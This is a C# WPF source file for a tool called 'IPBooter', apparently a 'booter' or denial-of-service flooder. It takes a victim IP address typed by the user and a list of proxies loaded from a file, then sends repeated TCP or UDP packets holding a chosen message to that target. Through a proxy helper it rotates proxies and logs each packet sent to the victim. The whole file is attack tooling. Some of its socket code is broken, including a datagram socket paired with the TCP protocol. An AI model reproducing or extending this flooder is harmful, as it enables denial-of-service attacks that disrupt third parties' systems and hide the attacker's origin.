using Microsoft.Win32;
using SetProxy;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using System.Windows.Media.Animation;
using System.Windows.Threading;

namespace CSharp_IPBooter
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    /// https://www.youtube.com/watch?v=aH95u5EC9Q0
    /// google 172.217.12.196
    public partial class MainWindow : Window
    {
        // Initial Variables
        string strMessageFile;
        string[] proxies;
        int count;
        int inter;
        bool started;
        string strConfirm;
        DispatcherTimer dt = new DispatcherTimer();

        public MainWindow()
        {
            // Initializing
            InitializeComponent();

            // Initializing timer
            inter = 1;
            dt.Interval = TimeSpan.FromSeconds(inter);
            dt.Tick += dtTicker;
            started = false;
            
            // When to stop
            if (count == 1000)
            {
                dt.Stop();
            }
        }

        // Timer method
        private void dtTicker(object sender, EventArgs e)
        {
            // Changing proxy
            lbUsingIP.Content = proxies[count];

            // Count the packets sent
            lbPacketsSent.Content = Convert.ToString(count);
            count++;
        }

        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            if (started == false)
            {
                string vicIPAddress = etVictimIP.Text;
                if (cbTCP.IsChecked == true)
                {
                    send_Packet_TCP(vicIPAddress);
                }
                else if (cbUDP.IsChecked == true)
                {
                    send_Packet_UDP(vicIPAddress);
                }
                else
                {
                    MessageBox.Show("Please Check Which Sending Format You Would Like \nTCP\nUDP", "Error");
                }
                dt.Start();
            }
            else
            {
                dt.Stop();
                started = false;
            }
        }

        private void send_Packet_UDP(string vicIPAddress)
        {
            string text;
            //line1:
            try
            {
                WinInetInterop.SetConnectionProxy(proxies[count]);
                using (StreamReader sr = new StreamReader(strMessageFile))
                {
                    text = sr.ReadToEnd();
                    string[] ipPort = proxies[count].Split(':');
                    //invalid ip
                    //IPAddress ip = IPAddress.Parse(ipPort[0].ToString());
                    //MessageBox.Show(ipPort[0].ToString(), "IP");
                    int port = Convert.ToInt32(ipPort[1]);

                    //Convert Message to bytes to be sent
                    byte[] packageData = System.Text.Encoding.ASCII.GetBytes(text);
                    IPAddress ip = IPAddress.Parse(vicIPAddress);

                    IPEndPoint ep = new IPEndPoint(ip, port);
                    Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                    try
                    {
                        for (int x = 0; x <= 4; x++)
                        {
                            client.SendTo(packageData, ep);
                            //sends timeout for 1 second
                            client.SendTimeout = 1000;
                            strConfirm += "Packet Sent From " + proxies[count] + " To " + vicIPAddress + "\n";
                            tblockConfirmation.Text = strConfirm;
                            count++;
                        }
                    }
                    catch (TimeoutException)
                    {
                        strConfirm += "Packet Failed From " + proxies[count] + " To " + vicIPAddress + "\n";
                        tblockConfirmation.Text = strConfirm;
                        //count++;
                        //goto line1;
                        }
                    }
                }
            catch (FileNotFoundException)
            {
                MessageBox.Show("File Cannot Be Read", "Error");
            }            
        }

        private void send_Packet_TCP(string vicIPAddress)
        {
            string text;
            //line1:
            try
            {
                WinInetInterop.SetConnectionProxy(proxies[count]);
                using (StreamReader sr = new StreamReader(strMessageFile))
                {
                    text = sr.ReadToEnd();
                    string[] ipPort = proxies[count].Split(':');
                    //invalid ip
                    //IPAddress ip = IPAddress.Parse(ipPort[0].ToString());
                    //MessageBox.Show(ipPort[0].ToString(), "IP");
                    int port = Convert.ToInt32(ipPort[1]);

                    //Convert Message to bytes to be sent
                    byte[] packageData = System.Text.Encoding.ASCII.GetBytes(text);
                    IPAddress ip = IPAddress.Parse(vicIPAddress);

                    IPEndPoint ep = new IPEndPoint(ip, port);
                    Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);

                    try
                    {
                        for (int x = 0; x <= 4; x++)
                        {
                            client.SendTo(packageData, ep);
                            //sends timeout for 1 second
                            client.SendTimeout = 1000;
                            strConfirm += "Packet Sent From " + proxies[count] + " To " + vicIPAddress + "\n";
                            tblockConfirmation.Text = strConfirm;
                            count++;
                        }
                    }
                    catch (TimeoutException)
                    {
                        strConfirm += "Packet Failed From " + proxies[count] + " To " + vicIPAddress + "\n";
                        tblockConfirmation.Text = strConfirm;
                        //count++;
                        //goto line1;
                    }
                }
            }
            catch (FileNotFoundException)
            {
                MessageBox.Show("File Cannot Be Read", "Error");
            }
        }

        private void btnProxy_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFile = new OpenFileDialog();
            openFile.DefaultExt = ".txt";
            openFile.Filter = "TXT Files (*.txt)|*.txt";

            if (openFile.ShowDialog() == true)
            {
                // Opens file
                string strProxyFile = openFile.FileName;
                MessageBox.Show(strProxyFile, "File Path Choosen For Proxies");

                // Reads File
                StreamReader stream = new StreamReader(strProxyFile);
                string fileData = stream.ReadToEnd();

                // Displaying Results
                string data = fileData.ToString();

                try
                {
                    // Put into Global Array
                    proxies = data.Split('\n');
                }
                catch (Exception)
                {
                    MessageBox.Show("File Could Not Be Converted To An Array", "Error");
                }
                // Close Reader
                stream.Close();
            }
        }

        private void btnMessage_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFile = new OpenFileDialog();
            openFile.DefaultExt = ".txt";
            openFile.Filter = "TXT Files (*.txt)|*.txt";

            if (openFile.ShowDialog() == true)
            {
                // Opens file
                strMessageFile = openFile.FileName;
                MessageBox.Show(strMessageFile, "File Path Choosen For Message");

            }
        }

        private void btnStop_Click(object sender, RoutedEventArgs e)
        {
            count = 0;
            dt.Stop();
        }
    }
}
